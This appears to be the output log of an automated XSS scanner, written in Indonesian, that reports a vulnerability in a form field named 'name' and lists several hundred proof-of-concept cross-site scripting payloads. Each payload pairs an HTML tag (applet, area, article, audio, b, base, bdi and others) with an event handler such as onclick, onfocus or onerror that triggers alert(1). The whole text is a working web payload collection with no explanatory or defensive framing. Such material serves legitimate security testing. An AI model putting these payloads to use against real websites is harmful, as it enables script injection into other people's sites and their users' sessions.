+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onclick="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet oncontextmenu="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet oncopy="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet oncut="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet ondblclick="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onkeydown="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onkeypress="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onkeyup="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmousedown="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmouseenter="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmouseleave="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmousemove="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmouseout="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmouseover="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onmouseup="alert(1)">test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onpaste="alert(1)" contenteditable>test</applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <applet onreadystatechange=alert(1)></applet>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area draggable="true" ondrag="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area draggable="true" ondragend="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area draggable="true" ondragenter="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area draggable="true" ondragleave="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area draggable="true" ondragstart="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area id=x tabindex=1 onactivate=alert(1)></area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area id=x tabindex=1 onbeforeactivate=alert(1)></area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onbeforecopy="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onbeforecut="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onbeforepaste="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onclick="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area oncontextmenu="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area oncopy="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area oncut="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area ondblclick="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onkeydown="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onkeypress="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onkeyup="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmousedown="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmouseenter="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmouseleave="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmousemove="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmouseout="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmouseover="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onmouseup="alert(1)">test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <area onpaste="alert(1)" contenteditable>test</area>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article draggable="true" ondrag="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article draggable="true" ondragend="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article draggable="true" ondragenter="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article draggable="true" ondragleave="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article draggable="true" ondragstart="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 onactivate=alert(1)></article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 onbeforeactivate=alert(1)></article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 onfocus=alert(1)></article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article id=x tabindex=1 onfocusin=alert(1)></article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onbeforecopy="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onbeforecut="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onbeforepaste="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onclick="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article oncontextmenu="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article oncopy="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article oncut="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article ondblclick="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onkeydown="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onkeypress="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onkeyup="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmousedown="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmouseenter="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmouseleave="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmousemove="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmouseout="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmouseover="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onmouseup="alert(1)">test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <article onpaste="alert(1)" contenteditable>test</article>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside draggable="true" ondrag="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside draggable="true" ondragend="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside draggable="true" ondragenter="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside draggable="true" ondragleave="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside draggable="true" ondragstart="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 onactivate=alert(1)></aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 onfocus=alert(1)></aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside id=x tabindex=1 onfocusin=alert(1)></aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onbeforecopy="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onbeforecut="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onbeforepaste="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onclick="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside oncontextmenu="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside oncopy="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside oncut="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside ondblclick="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onkeydown="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onkeypress="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onkeyup="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmousedown="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmouseenter="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmouseleave="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmousemove="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmouseout="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmouseover="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onmouseup="alert(1)">test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <aside onpaste="alert(1)" contenteditable>test</aside>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio draggable="true" ondrag="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio draggable="true" ondragend="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio draggable="true" ondragenter="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio draggable="true" ondragleave="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio draggable="true" ondragstart="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x controls onfocus=alert(1) id=x><source src="validaudio.wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x controls onfocusin=alert(1) id=x><source src="validaudio.wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x tabindex=1 onactivate=alert(1)></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onbeforecopy="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onbeforecut="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onbeforepaste="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onclick="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio oncontextmenu="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio oncopy="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio oncut="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio ondblclick="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onkeydown="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onkeypress="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onkeyup="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmousedown="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmouseenter="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmouseleave="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmousemove="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmouseout="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmouseover="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onmouseup="alert(1)">test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio onpaste="alert(1)" contenteditable>test</audio>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <audio src/onerror=alert(1)>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b draggable="true" ondrag="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b draggable="true" ondragend="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b draggable="true" ondragenter="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b draggable="true" ondragleave="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b draggable="true" ondragstart="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 onactivate=alert(1)></b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 onbeforeactivate=alert(1)></b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 onfocus=alert(1)></b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b id=x tabindex=1 onfocusin=alert(1)></b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onbeforecopy="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onbeforecut="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onbeforepaste="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onclick="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b oncontextmenu="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b oncopy="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b oncut="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b ondblclick="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onkeydown="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onkeypress="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onkeyup="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmousedown="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmouseenter="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmouseleave="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmousemove="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmouseout="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmouseover="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onmouseup="alert(1)">test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <b onpaste="alert(1)" contenteditable>test</b>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base draggable="true" ondrag="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base draggable="true" ondragend="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base draggable="true" ondragenter="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base draggable="true" ondragleave="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base draggable="true" ondragstart="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 onactivate=alert(1)></base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 onbeforeactivate=alert(1)></base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 onfocus=alert(1)></base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base id=x tabindex=1 onfocusin=alert(1)></base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onbeforecopy="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onbeforecut="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onbeforepaste="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onblur=alert(1) tabindex=1 id=x></base><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onclick="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base oncontextmenu="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base oncopy="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base oncut="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base ondblclick="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onkeydown="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onkeypress="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onkeyup="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmousedown="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmouseenter="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmouseleave="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmousemove="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmouseout="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmouseover="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onmouseup="alert(1)">test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <base onpaste="alert(1)" contenteditable>test</base>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont draggable="true" ondrag="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont draggable="true" ondragend="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont draggable="true" ondragenter="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont draggable="true" ondragleave="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont draggable="true" ondragstart="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 onactivate=alert(1)></basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 onfocus=alert(1)></basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont id=x tabindex=1 onfocusin=alert(1)></basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onbeforecut="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onbeforepaste="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onclick="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont oncontextmenu="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont oncopy="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont oncut="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont ondblclick="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onkeydown="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onkeypress="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onkeyup="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmousedown="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmouseenter="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmouseleave="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmousemove="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmouseout="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmouseover="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onmouseup="alert(1)">test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <basefont onpaste="alert(1)" contenteditable>test</basefont>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi draggable="true" ondrag="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi draggable="true" ondragend="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi draggable="true" ondragenter="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi draggable="true" ondragleave="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi draggable="true" ondragstart="alert(1)">test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 onactivate=alert(1)></bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 onfocus=alert(1)></bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi id=x tabindex=1 onfocusin=alert(1)></bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onbeforecut="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onbeforepaste="alert(1)" contenteditable>test</bdi>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>
+Kerentanan XSS ditemukan pada input field 'name' dengan payload: <bdi onclick="alert(1)">test</bdi>
